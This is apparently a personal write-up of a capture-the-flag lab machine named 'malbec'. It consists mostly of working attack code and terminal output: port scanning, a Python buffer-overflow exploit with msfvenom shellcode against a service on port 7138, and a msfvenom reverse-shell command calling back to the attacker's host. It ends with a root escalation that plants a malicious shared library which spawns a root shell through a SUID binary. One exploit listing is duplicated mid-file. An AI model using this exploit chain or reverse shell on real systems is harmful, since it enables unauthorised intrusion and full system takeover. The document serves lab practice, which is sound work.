## NMAP
```
sudo nmap -sC -sV -p- 192.168.55.129  
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-10 18:30 CST
Nmap scan report for 192.168.55.129
Host is up (0.046s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74ba2023899262029fe73d3b83d4d96c (RSA)
|   256 548f79555ab03a695ad5723964fd074e (ECDSA)
|_  256 7f5d102762ba75e9bcc84fe27287d4e2 (ED25519)
2121/tcp open  ftp     pyftpdlib 1.5.6
| ftp-syst: 
|   STAT: 
| FTP server status:
|  Connected to: 192.168.55.129:2121
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx   1 carlos   carlos     108304 Jan 25  2021 malbec.exe [NSE: writeable]
7138/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port7138-TCP:V=7.93%I=7%D=3/10%Time=640BCC06%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,4,"\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.55 seconds

```

## Enumeration
Downloaded the file malbec.exe from the anonymous ftp.

Loaded it up into immunity debugger.

Created a simple fuzzer using python.

```python
import socket  
  
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  
  
s.connect(('IP',PORT))  
  
data="A"*888 
s.send(data)  
  
s.close()
```

![[1 CCot_BdCLG3EI_YcHVMn9g.webp]]

```sh
msf-pattern_create -l 888
```

```
msf-pattern_create -l 888
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5
```

```python
import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.connect(('10.76.3.26',7138))

data="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5"

s.send(data)

s.close()

```

![[1 Hh9dXyczbhN7cyGIjV8SCg.webp]]
![[1 BKLMCiJtKq3v0O4wV7rWHA.webp]]

![[1 iQXXsGhGm3mVD38S6bZTLQ.webp]]

```sh
msfvenom -a x86 -p windows/exec CMD=calc.exe -f c -b ‘\x00’
```

Added the above output to the code

```
cat buffer3.py 
import socket
import struct

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.connect(('10.76.3.26',7138))

Shellcode = ("\xda\xd1\xd9\x74\x24\xf4\xb8\x67\x9e\x39\xa0\x5b\x33\xc9"
"\xb1\x31\x83\xc3\x04\x31\x43\x14\x03\x43\x73\x7c\xcc\x5c"
"\x93\x02\x2f\x9d\x63\x63\xb9\x78\x52\xa3\xdd\x09\xc4\x13"
"\x95\x5c\xe8\xd8\xfb\x74\x7b\xac\xd3\x7b\xcc\x1b\x02\xb5"
"\xcd\x30\x76\xd4\x4d\x4b\xab\x36\x6c\x84\xbe\x37\xa9\xf9"
"\x33\x65\x62\x75\xe1\x9a\x07\xc3\x3a\x10\x5b\xc5\x3a\xc5"
"\x2b\xe4\x6b\x58\x20\xbf\xab\x5a\xe5\xcb\xe5\x44\xea\xf6"
"\xbc\xff\xd8\x8d\x3e\xd6\x11\x6d\xec\x17\x9e\x9c\xec\x50"
"\x18\x7f\x9b\xa8\x5b\x02\x9c\x6e\x26\xd8\x29\x75\x80\xab"
"\x8a\x51\x31\x7f\x4c\x11\x3d\x34\x1a\x7d\x21\xcb\xcf\xf5"
"\x5d\x40\xee\xd9\xd4\x12\xd5\xfd\xbd\xc1\x74\xa7\x1b\xa7"
"\x89\xb7\xc4\x18\x2c\xb3\xe8\x4d\x5d\x9e\x66\x93\xd3\xa4"
"\xc4\x93\xeb\xa6\x78\xfc\xda\x2d\x17\x7b\xe3\xe7\x5c\x73"
"\xa9\xaa\xf4\x1c\x74\x3f\x45\x41\x87\x95\x89\x7c\x04\x1c"
"\x71\x7b\x14\x55\x74\xc7\x92\x85\x04\x58\x77\xaa\xbb\x59"
"\x52\xc9\x5a\xca\x3e\x20\xf9\x6a\xa4\x3c")

pushesp = struct.pack("<I",0x41101503)
data="A"*340 + pushesp + "\x90"*10 + Shellcode + "\x00"
s.send(data)cat buffer3.py 
import socket
import struct

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.connect(('10.76.3.26',7138))

Shellcode = ("\xda\xd1\xd9\x74\x24\xf4\xb8\x67\x9e\x39\xa0\x5b\x33\xc9"
"\xb1\x31\x83\xc3\x04\x31\x43\x14\x03\x43\x73\x7c\xcc\x5c"
"\x93\x02\x2f\x9d\x63\x63\xb9\x78\x52\xa3\xdd\x09\xc4\x13"
"\x95\x5c\xe8\xd8\xfb\x74\x7b\xac\xd3\x7b\xcc\x1b\x02\xb5"
"\xcd\x30\x76\xd4\x4d\x4b\xab\x36\x6c\x84\xbe\x37\xa9\xf9"
"\x33\x65\x62\x75\xe1\x9a\x07\xc3\x3a\x10\x5b\xc5\x3a\xc5"
"\x2b\xe4\x6b\x58\x20\xbf\xab\x5a\xe5\xcb\xe5\x44\xea\xf6"
"\xbc\xff\xd8\x8d\x3e\xd6\x11\x6d\xec\x17\x9e\x9c\xec\x50"
"\x18\x7f\x9b\xa8\x5b\x02\x9c\x6e\x26\xd8\x29\x75\x80\xab"
"\x8a\x51\x31\x7f\x4c\x11\x3d\x34\x1a\x7d\x21\xcb\xcf\xf5"
"\x5d\x40\xee\xd9\xd4\x12\xd5\xfd\xbd\xc1\x74\xa7\x1b\xa7"
"\x89\xb7\xc4\x18\x2c\xb3\xe8\x4d\x5d\x9e\x66\x93\xd3\xa4"
"\xc4\x93\xeb\xa6\x78\xfc\xda\x2d\x17\x7b\xe3\xe7\x5c\x73"
"\xa9\xaa\xf4\x1c\x74\x3f\x45\x41\x87\x95\x89\x7c\x04\x1c"
"\x71\x7b\x14\x55\x74\xc7\x92\x85\x04\x58\x77\xaa\xbb\x59"
"\x52\xc9\x5a\xca\x3e\x20\xf9\x6a\xa4\x3c")

pushesp = struct.pack("<I",0x41101503)
data="A"*340 + pushesp + "\x90"*10 + Shellcode + "\x00"
s.send(data)

s.close()

print "Success"


s.close()

print "Success"

```

```sh
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.49.55 LPORT=2121 -f c -b '\x00' EXITFUNC=thread
```

```
find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/mount
/usr/bin/passwd
/usr/bin/su
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/messenger
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/gpasswd
cat /usr/bin/messenger
/usr/bin/messenger
/usr/bin/messenger: error while loading shared libraries: libmalbec.so: cannot open shared object file: No such file or directory
ldd /usr/bin/messenger
        linux-vdso.so.1 (0x00007ffcbab94000)
        libmalbec.so => not found
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ff2a65e2000)
        /lib64/ld-linux-x86-64.so.2 (0x00007ff2a67b8000)

```

```
#include <stdio.h>  
#include <sys/types.h>  
#include <unistd.h>  
void malbec() {  
setuid(0); setgid(0); system("/bin/bash");  
}
```

```
carlos@malbec:/home/carlos$ gcc root.c -o libmalbec.so -shared -fPOC -w
gcc root.c -o libmalbec.so -shared -fPOC -w
gcc: error: unrecognized command line option '-fPOC'; did you mean '-fPIC'?
carlos@malbec:/home/carlos$ gcc root.c -o libmalbec.so -shared -fPIC -w
gcc root.c -o libmalbec.so -shared -fPIC -w
gcc: error trying to exec 'cc1': execvp: No such file or directory
carlos@malbec:/home/carlos$ export
export
declare -x LS_COLORS=""
declare -x OLDPWD="/home/carlos/sv"
declare -x PWD="/home/carlos"
declare -x SHLVL="1"
carlos@malbec:/home/carlos$ export PATH
export PATH
carlos@malbec:/home/carlos$ export
export
declare -x LS_COLORS=""
declare -x OLDPWD="/home/carlos/sv"
declare -x PATH="/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:."
declare -x PWD="/home/carlos"
declare -x SHLVL="1"
carlos@malbec:/home/carlos$ wget http://192.168.49.55/root.c
wget http://192.168.49.55/root.c
--2023-03-13 23:21:30--  http://192.168.49.55/root.c
Connecting to 192.168.49.55:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 133 [text/x-csrc]
Saving to: 'root.c'

root.c              100%[===================>]     133  --.-KB/s    in 0s      

2023-03-13 23:21:31 (35.6 MB/s) - 'root.c' saved [133/133]

carlos@malbec:/home/carlos$ ls
ls
local.txt  root.c  sv
carlos@malbec:/home/carlos$ cat root.c
cat root.c
#include <stdio.h>  
#include <sys/types.h>  
#include <unistd.h>  
void malbec() {  
setuid(0); setgid(0); system("/bin/bash");  
}
carlos@malbec:/home/carlos$ gcc root.c -o libmalbec.so -shared -fPIC -w
gcc root.c -o libmalbec.so -shared -fPIC -w
carlos@malbec:/home/carlos$ ls
ls
libmalbec.so  local.txt  root.c  sv
carlos@malbec:/home/carlos$ ldd /usr/bin/messenger
ldd /usr/bin/messenger
        linux-vdso.so.1 (0x00007ffc037d7000)
        libmalbec.so => /home/carlos/libmalbec.so (0x00007f31b3783000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f31b35c2000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f31b379d000)
carlos@malbec:/home/carlos$ whoami
whoami
carlos
carlos@malbec:/home/carlos$ /usr/bin/messenger
/usr/bin/messenger
root@malbec:/home/carlos# whoami
whoami
root
root@malbec:/home/carlos# cd /root
cd /root
root@malbec:/root# ls
ls
proof.txt
root@malbec:/root# cat proof.txt
cat proof.txt

```

Situation above.
User has access to /usr/bin/messenger.
Found that it was missing a library file.
Checked the file name in ldd.
Located the configuration file of malbec which didn't have much.
Strings of messenger did reference malbec.
I was able to create a library file as a shell using c to give us priv esc.
Compiling it as first reveals some issues with the PATH.
export shows there is no PATH set.
exported the PATH
It is now working
I had to generate the file on my machine and upload it using wget.
Compiled the C file
Checked using ldd that the file was now present.
Ran the messenger and became root.